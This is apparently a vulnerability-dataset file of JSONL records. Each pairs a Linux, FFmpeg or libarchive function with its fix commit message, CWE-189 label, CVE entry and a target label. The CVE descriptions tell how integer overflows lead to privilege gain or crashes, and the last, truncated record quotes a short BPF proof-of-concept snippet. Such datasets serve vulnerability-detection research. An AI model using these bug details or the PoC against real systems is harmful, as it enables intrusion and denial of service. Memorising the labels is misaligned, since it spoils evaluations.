{"idx": 158519, "project": "linux", "commit_id": "a5cd335165e31db9dbab636fd29895d41da55dd2", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/a5cd335165e31db9dbab636fd29895d41da55dd2", "commit_message": "drm: integer overflow in drm_mode_dirtyfb_ioctl()\n\nThere is a potential integer overflow in drm_mode_dirtyfb_ioctl()\nif userspace passes in a large num_clips.  The call to kmalloc would\nallocate a small buffer, and the call to fb->funcs->dirty may result\nin a memory corruption.\n\nReported-by: Haogang Chen <haogangchen@gmail.com>\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nCc: stable@kernel.org\nSigned-off-by: Dave Airlie <airlied@redhat.com>", "target": 0, "func": "int drm_mode_dirtyfb_ioctl(struct drm_device *dev,\n\t\t\t   void *data, struct drm_file *file_priv)\n{\n\tstruct drm_clip_rect __user *clips_ptr;\n\tstruct drm_clip_rect *clips = NULL;\n\tstruct drm_mode_fb_dirty_cmd *r = data;\n\tstruct drm_mode_object *obj;\n\tstruct drm_framebuffer *fb;\n\tunsigned flags;\n\tint num_clips;\n\tint ret = 0;\n\n\tif (!drm_core_check_feature(dev, DRIVER_MODESET))\n\t\treturn -EINVAL;\n\n\tmutex_lock(&dev->mode_config.mutex);\n\tobj = drm_mode_object_find(dev, r->fb_id, DRM_MODE_OBJECT_FB);\n\tif (!obj) {\n\t\tDRM_ERROR(\"invalid framebuffer id\\n\");\n\t\tret = -EINVAL;\n\t\tgoto out_err1;\n\t}\n\tfb = obj_to_fb(obj);\n\n\tnum_clips = r->num_clips;\n\tclips_ptr = (struct drm_clip_rect *)(unsigned long)r->clips_ptr;\n\n\tif (!num_clips != !clips_ptr) {\n\t\tret = -EINVAL;\n\t\tgoto out_err1;\n\t}\n\n\tflags = DRM_MODE_FB_DIRTY_FLAGS & r->flags;\n\n\t/* If userspace annotates copy, clips must come in pairs */\n\tif (flags & DRM_MODE_FB_DIRTY_ANNOTATE_COPY && (num_clips % 2)) {\n\t\tret = -EINVAL;\n\t\tgoto out_err1;\n \t}\n \n \tif (num_clips && clips_ptr) {\n\t\tif (num_clips < 0 || num_clips > DRM_MODE_FB_DIRTY_MAX_CLIPS) {\n\t\t\tret = -EINVAL;\n\t\t\tgoto out_err1;\n\t\t}\n \t\tclips = kzalloc(num_clips * sizeof(*clips), GFP_KERNEL);\n \t\tif (!clips) {\n \t\t\tret = -ENOMEM;\n\t\t\tgoto out_err1;\n\t\t}\n\n\t\tret = copy_from_user(clips, clips_ptr,\n\t\t\t\t     num_clips * sizeof(*clips));\n\t\tif (ret) {\n\t\t\tret = -EFAULT;\n\t\t\tgoto out_err2;\n\t\t}\n\t}\n\n\tif (fb->funcs->dirty) {\n\t\tret = fb->funcs->dirty(fb, file_priv, flags, r->color,\n\t\t\t\t       clips, num_clips);\n\t} else {\n\t\tret = -ENOSYS;\n\t\tgoto out_err2;\n\t}\n\nout_err2:\n\tkfree(clips);\nout_err1:\n\tmutex_unlock(&dev->mode_config.mutex);\n\treturn ret;\n}\n", "func_hash": 72844617414097371511584998420562300996, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2012-0044", "cve_desc": "Integer overflow in the drm_mode_dirtyfb_ioctl function in drivers/gpu/drm/drm_crtc.c in the Direct Rendering Manager (DRM) subsystem in the Linux kernel before 3.1.5 allows local users to gain privileges or cause a denial of service (memory corruption) via a crafted ioctl call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-0044"}
{"idx": 158585, "project": "linux", "commit_id": "56c6a8a4aadca809e04276eabe5552935c51387f", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/56c6a8a4aadca809e04276eabe5552935c51387f", "commit_message": "None", "target": 0, "func": " unsigned int oom_badness(struct task_struct *p, struct mem_cgroup *mem,\n \t\t      const nodemask_t *nodemask, unsigned long totalpages)\n {\n\tlong points;\n \n \tif (oom_unkillable_task(p, mem, nodemask))\n \t\treturn 0;\n\n\tp = find_lock_task_mm(p);\n\tif (!p)\n\t\treturn 0;\n\n\t/*\n\t * Shortcut check for a thread sharing p->mm that is OOM_SCORE_ADJ_MIN\n\t * so the entire heuristic doesn't need to be executed for something\n\t * that cannot be killed.\n\t */\n\tif (atomic_read(&p->mm->oom_disable_count)) {\n\t\ttask_unlock(p);\n\t\treturn 0;\n\t}\n\n\t/*\n\t * The memory controller may have a limit of 0 bytes, so avoid a divide\n\t * by zero, if necessary.\n\t */\n\tif (!totalpages)\n\t\ttotalpages = 1;\n\n\t/*\n\t * The baseline for the badness score is the proportion of RAM that each\n\t * task's rss, pagetable and swap space use.\n\t */\n\tpoints = get_mm_rss(p->mm) + p->mm->nr_ptes;\n\tpoints += get_mm_counter(p->mm, MM_SWAPENTS);\n\n\tpoints *= 1000;\n\tpoints /= totalpages;\n\ttask_unlock(p);\n\n\t/*\n\t * Root processes get 3% bonus, just like the __vm_enough_memory()\n\t * implementation used by LSMs.\n\t */\n\tif (has_capability_noaudit(p, CAP_SYS_ADMIN))\n\t\tpoints -= 30;\n\n\t/*\n\t * /proc/pid/oom_score_adj ranges from -1000 to +1000 such that it may\n\t * either completely disable oom killing or always prefer a certain\n\t * task.\n\t */\n\tpoints += p->signal->oom_score_adj;\n\n\t/*\n\t * Never return 0 for an eligible task that may be killed since it's\n\t * possible that no single user task uses more than 0.1% of memory and\n\t * no single admin tasks uses more than 3.0%.\n\t */\n\tif (points <= 0)\n\t\treturn 1;\n\treturn (points < 1000) ? points : 1000;\n}\n", "func_hash": 272130603065112980321801198259609132059, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2011-4097", "cve_desc": "Integer overflow in the oom_badness function in mm/oom_kill.c in the Linux kernel before 3.1.8 on 64-bit platforms allows local users to cause a denial of service (memory consumption or process termination) by using a certain large amount of memory.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-4097"}
{"idx": 158733, "project": "FFmpeg", "commit_id": "86736f59d6a527d8bc807d09b93f971c0fe0bb07", "project_url": "https://github.com/FFmpeg/FFmpeg", "commit_url": "https://github.com/FFmpeg/FFmpeg/commit/86736f59d6a527d8bc807d09b93f971c0fe0bb07", "commit_message": "avcodec/pngdsp: fix (un)signed type in end comparission\n\nFixes out of array accesses\nFixes Ticket2919\n\nFound_by: ami_stuff\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>", "target": 0, "func": " static void add_bytes_l2_c(uint8_t *dst, uint8_t *src1, uint8_t *src2, int w)\n {\n     long i;\n    for (i = 0; i <= w - (int)sizeof(long); i += sizeof(long)) {\n         long a = *(long *)(src1 + i);\n         long b = *(long *)(src2 + i);\n         *(long *)(dst + i) = ((a & pb_7f) + (b & pb_7f)) ^ ((a ^ b) & pb_80);\n    }\n    for (; i < w; i++)\n        dst[i] = src1[i] + src2[i];\n}\n", "func_hash": 132338722680055218498024667163227574605, "file_name": "pngdsp.c", "file_hash": 77830949276076409414523976093444946089, "cwe": ["CWE-189"], "cve": "CVE-2013-7014", "cve_desc": "Integer signedness error in the add_bytes_l2_c function in libavcodec/pngdsp.c in FFmpeg before 2.1 allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted PNG data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-7014"}
{"idx": 158747, "project": "linux", "commit_id": "a497e47d4aec37aaf8f13509f3ef3d1f6a717d88", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/a497e47d4aec37aaf8f13509f3ef3d1f6a717d88", "commit_message": "libertas: potential oops in debugfs\n\nIf we do a zero size allocation then it will oops.  Also we can't be\nsure the user passes us a NUL terminated string so I've added a\nterminator.\n\nThis code can only be triggered by root.\n\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nAcked-by: Dan Williams <dcbw@redhat.com>\nSigned-off-by: John W. Linville <linville@tuxdriver.com>", "target": 0, "func": "static ssize_t lbs_debugfs_write(struct file *f, const char __user *buf,\n\t\t\t    size_t cnt, loff_t *ppos)\n{\n\tint r, i;\n\tchar *pdata;\n\tchar *p;\n\tchar *p0;\n\tchar *p1;\n \tchar *p2;\n \tstruct debug_data *d = f->private_data;\n \n\tif (cnt == 0)\n\t\treturn 0;\n\n\tpdata = kmalloc(cnt + 1, GFP_KERNEL);\n \tif (pdata == NULL)\n \t\treturn 0;\n \n\tif (copy_from_user(pdata, buf, cnt)) {\n\t\tlbs_deb_debugfs(\"Copy from user failed\\n\");\n \t\tkfree(pdata);\n \t\treturn 0;\n \t}\n\tpdata[cnt] = '\\0';\n \n \tp0 = pdata;\n \tfor (i = 0; i < num_of_items; i++) {\n\t\tdo {\n\t\t\tp = strstr(p0, d[i].name);\n\t\t\tif (p == NULL)\n\t\t\t\tbreak;\n\t\t\tp1 = strchr(p, '\\n');\n\t\t\tif (p1 == NULL)\n\t\t\t\tbreak;\n\t\t\tp0 = p1++;\n\t\t\tp2 = strchr(p, '=');\n\t\t\tif (!p2)\n\t\t\t\tbreak;\n\t\t\tp2++;\n\t\t\tr = simple_strtoul(p2, NULL, 0);\n\t\t\tif (d[i].size == 1)\n\t\t\t\t*((u8 *) d[i].addr) = (u8) r;\n\t\t\telse if (d[i].size == 2)\n\t\t\t\t*((u16 *) d[i].addr) = (u16) r;\n\t\t\telse if (d[i].size == 4)\n\t\t\t\t*((u32 *) d[i].addr) = (u32) r;\n\t\t\telse if (d[i].size == 8)\n\t\t\t\t*((u64 *) d[i].addr) = (u64) r;\n\t\t\tbreak;\n\t\t} while (1);\n\t}\n\tkfree(pdata);\n\n\treturn (ssize_t)cnt;\n}\n", "func_hash": 233211545593580187393050089721528796915, "file_name": "debugfs.c", "file_hash": 41257289586596894026698054176206077844, "cwe": ["CWE-189"], "cve": "CVE-2013-6378", "cve_desc": "The lbs_debugfs_write function in drivers/net/wireless/libertas/debugfs.c in the Linux kernel through 3.12.1 allows local users to cause a denial of service (OOPS) by leveraging root privileges for a zero-length write operation.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-6378"}
{"idx": 158748, "project": "linux", "commit_id": "17d68b763f09a9ce824ae23eb62c9efc57b69271", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/17d68b763f09a9ce824ae23eb62c9efc57b69271", "commit_message": "KVM: x86: fix guest-initiated crash with x2apic (CVE-2013-6376)\n\nA guest can cause a BUG_ON() leading to a host kernel crash.\nWhen the guest writes to the ICR to request an IPI, while in x2apic\nmode the following things happen, the destination is read from\nICR2, which is a register that the guest can control.\n\nkvm_irq_delivery_to_apic_fast uses the high 16 bits of ICR2 as the\ncluster id.  A BUG_ON is triggered, which is a protection against\naccessing map->logical_map with an out-of-bounds access and manages\nto avoid that anything really unsafe occurs.\n\nThe logic in the code is correct from real HW point of view. The problem\nis that KVM supports only one cluster with ID 0 in clustered mode, but\nthe code that has the bug does not take this into account.\n\nReported-by: Lars Bull <larsbull@google.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Gleb Natapov <gleb@redhat.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>", "target": 0, "func": " static void recalculate_apic_map(struct kvm *kvm)\n {\n \tstruct kvm_apic_map *new, *old = NULL;\n\tstruct kvm_vcpu *vcpu;\n\tint i;\n\n\tnew = kzalloc(sizeof(struct kvm_apic_map), GFP_KERNEL);\n\n\tmutex_lock(&kvm->arch.apic_map_lock);\n\n\tif (!new)\n\t\tgoto out;\n\n\tnew->ldr_bits = 8;\n\t/* flat mode is default */\n\tnew->cid_shift = 8;\n\tnew->cid_mask = 0;\n\tnew->lid_mask = 0xff;\n\n\tkvm_for_each_vcpu(i, vcpu, kvm) {\n\t\tstruct kvm_lapic *apic = vcpu->arch.apic;\n\t\tu16 cid, lid;\n\t\tu32 ldr;\n\n\t\tif (!kvm_apic_present(vcpu))\n\t\t\tcontinue;\n\n\t\t/*\n\t\t * All APICs have to be configured in the same mode by an OS.\n\t\t * We take advatage of this while building logical id loockup\n\t\t * table. After reset APICs are in xapic/flat mode, so if we\n\t\t * find apic with different setting we assume this is the mode\n\t\t * OS wants all apics to be in; build lookup table accordingly.\n\t\t */\n \t\tif (apic_x2apic_mode(apic)) {\n \t\t\tnew->ldr_bits = 32;\n \t\t\tnew->cid_shift = 16;\n\t\t\tnew->cid_mask = (1 << KVM_X2APIC_CID_BITS) - 1;\n\t\t\tnew->lid_mask = 0xffff;\n \t\t} else if (kvm_apic_sw_enabled(apic) &&\n \t\t\t\t!new->cid_mask /* flat mode */ &&\n \t\t\t\tkvm_apic_get_reg(apic, APIC_DFR) == APIC_DFR_CLUSTER) {\n\t\t\tnew->cid_shift = 4;\n\t\t\tnew->cid_mask = 0xf;\n\t\t\tnew->lid_mask = 0xf;\n\t\t}\n\n\t\tnew->phys_map[kvm_apic_id(apic)] = apic;\n\n\t\tldr = kvm_apic_get_reg(apic, APIC_LDR);\n\t\tcid = apic_cluster_id(new, ldr);\n\t\tlid = apic_logical_id(new, ldr);\n\n\t\tif (lid)\n\t\t\tnew->logical_map[cid][ffs(lid) - 1] = apic;\n\t}\nout:\n\told = rcu_dereference_protected(kvm->arch.apic_map,\n\t\t\tlockdep_is_held(&kvm->arch.apic_map_lock));\n\trcu_assign_pointer(kvm->arch.apic_map, new);\n\tmutex_unlock(&kvm->arch.apic_map_lock);\n\n\tif (old)\n\t\tkfree_rcu(old, rcu);\n\n\tkvm_vcpu_request_scan_ioapic(kvm);\n}\n", "func_hash": 255330493411169587262083220621426604364, "file_name": "lapic.c", "file_hash": 117888982784563867313503969523327524835, "cwe": ["CWE-189"], "cve": "CVE-2013-6376", "cve_desc": "The recalculate_apic_map function in arch/x86/kvm/lapic.c in the KVM subsystem in the Linux kernel through 3.12.5 allows guest OS users to cause a denial of service (host OS crash) via a crafted ICR write operation in x2apic mode.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-6376"}
{"idx": 158758, "project": "linux", "commit_id": "0e033e04c2678dbbe74a46b23fffb7bb918c288e", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/0e033e04c2678dbbe74a46b23fffb7bb918c288e", "commit_message": "ipv6: fix headroom calculation in udp6_ufo_fragment\n\nCommit 1e2bd517c108816220f262d7954b697af03b5f9c (\"udp6: Fix udp\nfragmentation for tunnel traffic.\") changed the calculation if\nthere is enough space to include a fragment header in the skb from a\nskb->mac_header dervived one to skb_headroom. Because we already peeled\noff the skb to transport_header this is wrong. Change this back to check\nif we have enough room before the mac_header.\n\nThis fixes a panic Saran Neti reported. He used the tbf scheduler which\nskb_gso_segments the skb. The offsets get negative and we panic in memcpy\nbecause the skb was erroneously not expanded at the head.\n\nReported-by: Saran Neti <Saran.Neti@telus.com>\nCc: Pravin B Shelar <pshelar@nicira.com>\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "static struct sk_buff *udp6_ufo_fragment(struct sk_buff *skb,\n\t\t\t\t\t netdev_features_t features)\n{\n\tstruct sk_buff *segs = ERR_PTR(-EINVAL);\n\tunsigned int mss;\n\tunsigned int unfrag_ip6hlen, unfrag_len;\n\tstruct frag_hdr *fptr;\n\tu8 *packet_start, *prevhdr;\n\tu8 nexthdr;\n\tu8 frag_hdr_sz = sizeof(struct frag_hdr);\n\tint offset;\n\t__wsum csum;\n\tint tnl_hlen;\n\n\tmss = skb_shinfo(skb)->gso_size;\n\tif (unlikely(skb->len <= mss))\n\t\tgoto out;\n\n\tif (skb_gso_ok(skb, features | NETIF_F_GSO_ROBUST)) {\n\t\t/* Packet is from an untrusted source, reset gso_segs. */\n\t\tint type = skb_shinfo(skb)->gso_type;\n\n\t\tif (unlikely(type & ~(SKB_GSO_UDP |\n\t\t\t\t      SKB_GSO_DODGY |\n\t\t\t\t      SKB_GSO_UDP_TUNNEL |\n\t\t\t\t      SKB_GSO_GRE |\n\t\t\t\t      SKB_GSO_IPIP |\n\t\t\t\t      SKB_GSO_SIT |\n\t\t\t\t      SKB_GSO_MPLS) ||\n\t\t\t     !(type & (SKB_GSO_UDP))))\n\t\t\tgoto out;\n\n\t\tskb_shinfo(skb)->gso_segs = DIV_ROUND_UP(skb->len, mss);\n\n\t\tsegs = NULL;\n\t\tgoto out;\n\t}\n\n\tif (skb->encapsulation && skb_shinfo(skb)->gso_type & SKB_GSO_UDP_TUNNEL)\n\t\tsegs = skb_udp_tunnel_segment(skb, features);\n\telse {\n\t\t/* Do software UFO. Complete and fill in the UDP checksum as HW cannot\n\t\t * do checksum of UDP packets sent as multiple IP fragments.\n\t\t */\n\t\toffset = skb_checksum_start_offset(skb);\n\t\tcsum = skb_checksum(skb, offset, skb->len - offset, 0);\n\t\toffset += skb->csum_offset;\n\t\t*(__sum16 *)(skb->data + offset) = csum_fold(csum);\n\t\tskb->ip_summed = CHECKSUM_NONE;\n \n \t\t/* Check if there is enough headroom to insert fragment header. */\n \t\ttnl_hlen = skb_tnl_header_len(skb);\n\t\tif (skb->mac_header < (tnl_hlen + frag_hdr_sz)) {\n \t\t\tif (gso_pskb_expand_head(skb, tnl_hlen + frag_hdr_sz))\n \t\t\t\tgoto out;\n \t\t}\n\n\t\t/* Find the unfragmentable header and shift it left by frag_hdr_sz\n\t\t * bytes to insert fragment header.\n\t\t */\n\t\tunfrag_ip6hlen = ip6_find_1stfragopt(skb, &prevhdr);\n\t\tnexthdr = *prevhdr;\n\t\t*prevhdr = NEXTHDR_FRAGMENT;\n\t\tunfrag_len = (skb_network_header(skb) - skb_mac_header(skb)) +\n\t\t\t     unfrag_ip6hlen + tnl_hlen;\n\t\tpacket_start = (u8 *) skb->head + SKB_GSO_CB(skb)->mac_offset;\n\t\tmemmove(packet_start-frag_hdr_sz, packet_start, unfrag_len);\n\n\t\tSKB_GSO_CB(skb)->mac_offset -= frag_hdr_sz;\n\t\tskb->mac_header -= frag_hdr_sz;\n\t\tskb->network_header -= frag_hdr_sz;\n\n\t\tfptr = (struct frag_hdr *)(skb_network_header(skb) + unfrag_ip6hlen);\n\t\tfptr->nexthdr = nexthdr;\n\t\tfptr->reserved = 0;\n\t\tipv6_select_ident(fptr, (struct rt6_info *)skb_dst(skb));\n\n\t\t/* Fragment the skb. ipv6 header and the remaining fields of the\n\t\t * fragment header are updated in ipv6_gso_segment()\n\t\t */\n\t\tsegs = skb_segment(skb, features);\n\t}\n\nout:\n\treturn segs;\n}\n", "func_hash": 153608604574028516941374555274737447771, "file_name": "udp_offload.c", "file_hash": 211155262577847335361922507544905009994, "cwe": ["CWE-189"], "cve": "CVE-2013-4563", "cve_desc": "The udp6_ufo_fragment function in net/ipv6/udp_offload.c in the Linux kernel through 3.12, when UDP Fragmentation Offload (UFO) is enabled, does not properly perform a certain size comparison before inserting a fragment header, which allows remote attackers to cause a denial of service (panic) via a large IPv6 UDP packet, as demonstrated by use of the Token Bucket Filter (TBF) queueing discipline.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4563"}
{"idx": 158781, "project": "linux", "commit_id": "6062a8dc0517bce23e3c2f7d2fea5e22411269a3", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/6062a8dc0517bce23e3c2f7d2fea5e22411269a3", "commit_message": "ipc,sem: fine grained locking for semtimedop\n\nIntroduce finer grained locking for semtimedop, to handle the common case\nof a program wanting to manipulate one semaphore from an array with\nmultiple semaphores.\n\nIf the call is a semop manipulating just one semaphore in an array with\nmultiple semaphores, only take the lock for that semaphore itself.\n\nIf the call needs to manipulate multiple semaphores, or another caller is\nin a transaction that manipulates multiple semaphores, the sem_array lock\nis taken, as well as all the locks for the individual semaphores.\n\nOn a 24 CPU system, performance numbers with the semop-multi\ntest with N threads and N semaphores, look like this:\n\n\tvanilla\t\tDavidlohr's\tDavidlohr's +\tDavidlohr's +\nthreads\t\t\tpatches\t\trwlock patches\tv3 patches\n10\t610652\t\t726325\t\t1783589\t\t2142206\n20\t341570\t\t365699\t\t1520453\t\t1977878\n30\t288102\t\t307037\t\t1498167\t\t2037995\n40\t290714\t\t305955\t\t1612665\t\t2256484\n50\t288620\t\t312890\t\t1733453\t\t2650292\n60\t289987\t\t306043\t\t1649360\t\t2388008\n70\t291298\t\t306347\t\t1723167\t\t2717486\n80\t290948\t\t305662\t\t1729545\t\t2763582\n90\t290996\t\t306680\t\t1736021\t\t2757524\n100\t292243\t\t306700\t\t1773700\t\t3059159\n\n[davidlohr.bueso@hp.com: do not call sem_lock when bogus sma]\n[davidlohr.bueso@hp.com: make refcounter atomic]\nSigned-off-by: Rik van Riel <riel@redhat.com>\nSuggested-by: Linus Torvalds <torvalds@linux-foundation.org>\nAcked-by: Davidlohr Bueso <davidlohr.bueso@hp.com>\nCc: Chegu Vinod <chegu_vinod@hp.com>\nCc: Jason Low <jason.low2@hp.com>\nReviewed-by: Michel Lespinasse <walken@google.com>\nCc: Peter Hurley <peter@hurleysoftware.com>\nCc: Stanislav Kinsbursky <skinsbursky@parallels.com>\nTested-by: Emmanuel Benisty <benisty.e@gmail.com>\nTested-by: Sedat Dilek <sedat.dilek@gmail.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 0, "func": " void ipc_rcu_putref(void *ptr)\n {\n\tif (!atomic_dec_and_test(&container_of(ptr, struct ipc_rcu_hdr, data)->refcount))\n \t\treturn;\n \n \tif (container_of(ptr, struct ipc_rcu_hdr, data)->is_vmalloc) {\n\t\tcall_rcu(&container_of(ptr, struct ipc_rcu_grace, data)->rcu,\n\t\t\t\tipc_schedule_free);\n\t} else {\n\t\tkfree_rcu(container_of(ptr, struct ipc_rcu_grace, data), rcu);\n\t}\n}\n", "func_hash": 197603455992421624982661019707871459048, "file_name": "util.c", "file_hash": 44742915001977674062646830565038462250, "cwe": ["CWE-189"], "cve": "CVE-2013-4483", "cve_desc": "The ipc_rcu_putref function in ipc/util.c in the Linux kernel before 3.10 does not properly manage a reference count, which allows local users to cause a denial of service (memory consumption or system crash) via a crafted application.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4483"}
{"idx": 158802, "project": "linux", "commit_id": "1fc29bacedeabb278080e31bb9c1ecb49f143c3b", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/1fc29bacedeabb278080e31bb9c1ecb49f143c3b", "commit_message": "cifs: fix off-by-one bug in build_unc_path_to_root\n\ncommit 839db3d10a (cifs: fix up handling of prefixpath= option) changed\nthe code such that the vol->prepath no longer contained a leading\ndelimiter and then fixed up the places that accessed that field to\naccount for that change.\n\nOne spot in build_unc_path_to_root was missed however. When doing the\npointer addition on pos, that patch failed to account for the fact that\nwe had already incremented \"pos\" by one when adding the length of the\nprepath. This caused a buffer overrun by one byte.\n\nThis patch fixes the problem by correcting the handling of \"pos\".\n\nCc: <stable@vger.kernel.org> # v3.8+\nReported-by: Marcus Moeller <marcus.moeller@gmx.ch>\nReported-by: Ken Fallon <ken.fallon@gmail.com>\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <sfrench@us.ibm.com>", "target": 0, "func": "build_unc_path_to_root(const struct smb_vol *vol,\n\t\tconst struct cifs_sb_info *cifs_sb)\n{\n\tchar *full_path, *pos;\n\tunsigned int pplen = vol->prepath ? strlen(vol->prepath) + 1 : 0;\n\tunsigned int unc_len = strnlen(vol->UNC, MAX_TREE_SIZE + 1);\n\n\tfull_path = kmalloc(unc_len + pplen + 1, GFP_KERNEL);\n\tif (full_path == NULL)\n\t\treturn ERR_PTR(-ENOMEM);\n\n\tstrncpy(full_path, vol->UNC, unc_len);\n \tpos = full_path + unc_len;\n \n \tif (pplen) {\n\t\t*pos = CIFS_DIR_SEP(cifs_sb);\n\t\tstrncpy(pos + 1, vol->prepath, pplen);\n \t\tpos += pplen;\n \t}\n \n\t*pos = '\\0'; /* add trailing null */\n\tconvert_delimiter(full_path, CIFS_DIR_SEP(cifs_sb));\n\tcifs_dbg(FYI, \"%s: full_path=%s\\n\", __func__, full_path);\n\treturn full_path;\n}\n", "func_hash": 314585337494192768360081406521262726411, "file_name": "connect.c", "file_hash": 88857981430770808203890685287516844319, "cwe": ["CWE-189"], "cve": "CVE-2013-4247", "cve_desc": "Off-by-one error in the build_unc_path_to_root function in fs/cifs/connect.c in the Linux kernel before 3.9.6 allows remote attackers to cause a denial of service (memory corruption and system crash) via a DFS share mount operation that triggers use of an unexpected DFS referral name length.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4247"}
{"idx": 158827, "project": "linux", "commit_id": "fc9bbca8f650e5f738af8806317c0a041a48ae4a", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/fc9bbca8f650e5f738af8806317c0a041a48ae4a", "commit_message": "vm: convert fb_mmap to vm_iomap_memory() helper\n\nThis is my example conversion of a few existing mmap users.  The\nfb_mmap() case is a good example because it is a bit more complicated\nthan some: fb_mmap() mmaps one of two different memory areas depending\non the page offset of the mmap (but happily there is never any mixing of\nthe two, so the helper function still works).\n\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 0, "func": "fb_mmap(struct file *file, struct vm_area_struct * vma)\n {\n \tstruct fb_info *info = file_fb_info(file);\n \tstruct fb_ops *fb;\n\tunsigned long mmio_pgoff;\n \tunsigned long start;\n \tu32 len;\n \n \tif (!info)\n \t\treturn -ENODEV;\n \tfb = info->fbops;\n \tif (!fb)\n \t\treturn -ENODEV;\n\tmutex_lock(&info->mm_lock);\n\tif (fb->fb_mmap) {\n\t\tint res;\n\t\tres = fb->fb_mmap(info, vma);\n\t\tmutex_unlock(&info->mm_lock);\n \t\treturn res;\n \t}\n \n\t/*\n\t * Ugh. This can be either the frame buffer mapping, or\n\t * if pgoff points past it, the mmio mapping.\n\t */\n \tstart = info->fix.smem_start;\n\tlen = info->fix.smem_len;\n\tmmio_pgoff = PAGE_ALIGN((start & ~PAGE_MASK) + len) >> PAGE_SHIFT;\n\tif (vma->vm_pgoff >= mmio_pgoff) {\n\t\tvma->vm_pgoff -= mmio_pgoff;\n \t\tstart = info->fix.mmio_start;\n\t\tlen = info->fix.mmio_len;\n \t}\n \tmutex_unlock(&info->mm_lock);\n\n \tvma->vm_page_prot = vm_get_page_prot(vma->vm_flags);\n\tfb_pgprotect(file, vma, start);\n\n\treturn vm_iomap_memory(vma, start, len);\n }\n", "func_hash": 280378351628973448196134758580254499320, "file_name": "fbmem.c", "file_hash": 332990640300605965736272929227510579328, "cwe": ["CWE-189"], "cve": "CVE-2013-2596", "cve_desc": "Integer overflow in the fb_mmap function in drivers/video/fbmem.c in the Linux kernel before 3.8.9, as used in a certain Motorola build of Android 4.1.2 and other products, allows local users to create a read-write memory mapping for the entirety of kernel memory, and consequently gain privileges, via crafted /dev/graphics/fb0 mmap2 system calls, as demonstrated by the Motochopper pwn program.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-2596"}
{"idx": 158907, "project": "libarchive", "commit_id": "22531545514043e04633e1c015c7540b9de9dbe4", "project_url": "https://github.com/libarchive/libarchive", "commit_url": "https://github.com/libarchive/libarchive/commit/22531545514043e04633e1c015c7540b9de9dbe4", "commit_message": "Limit write requests to at most INT_MAX.\nThis prevents a certain common programming error (passing -1 to write)\nfrom leading to other problems deeper in the library.", "target": 0, "func": " _archive_write_data(struct archive *_a, const void *buff, size_t s)\n {\n \tstruct archive_write *a = (struct archive_write *)_a;\n\tconst size_t max_write = INT_MAX;\n\n \tarchive_check_magic(&a->archive, ARCHIVE_WRITE_MAGIC,\n \t    ARCHIVE_STATE_DATA, \"archive_write_data\");\n\t/* In particular, this catches attempts to pass negative values. */\n\tif (s > max_write)\n\t\ts = max_write;\n \tarchive_clear_error(&a->archive);\n \treturn ((a->format_write_data)(a, buff, s));\n }\n", "func_hash": 280395881836362558906318660756506960450, "file_name": "archive_write.c", "file_hash": 173125723841928213196363231938589908387, "cwe": ["CWE-189"], "cve": "CVE-2013-0211", "cve_desc": "Integer signedness error in the archive_write_zip_data function in archive_write_set_format_zip.c in libarchive 3.1.2 and earlier, when running on 64-bit machines, allows context-dependent attackers to cause a denial of service (crash) via unspecified vectors, which triggers an improper conversion between unsigned and signed types, leading to a buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-0211"}
{"idx": 159037, "project": "linux", "commit_id": "05ab8f2647e4221cbdb3856dd7d32bd5407316b3", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/05ab8f2647e4221cbdb3856dd7d32bd5407316b3", "commit_message": "filter: prevent nla extensions to peek beyond the end of the message\n\nThe BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check\nfor a minimal message length before testing the supplied offset to be\nwithin the bounds of the message. This allows the subtraction of the nla\nheader to underflow and therefore -- as the data type is unsigned --\nallowing far to big offset and length values for the search of the\nnetlink attribute.\n\nThe remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is\nalso wrong. It has the minuend and subtrahend mixed up, therefore\ncalculates a huge length value, allowing to overrun the end of the\nmessage while looking for the netlink attribute.\n\nThe following three BPF snippets will trigger the bugs when attached to\na UNIX datagram socket and parsing a message with length 1, 2 or 3.\n\n ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--\n | ld\t#0x87654321\n | ldx\t#42\n | ld\t#nla\n | ret\ta\n `---\n\n ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--\n | 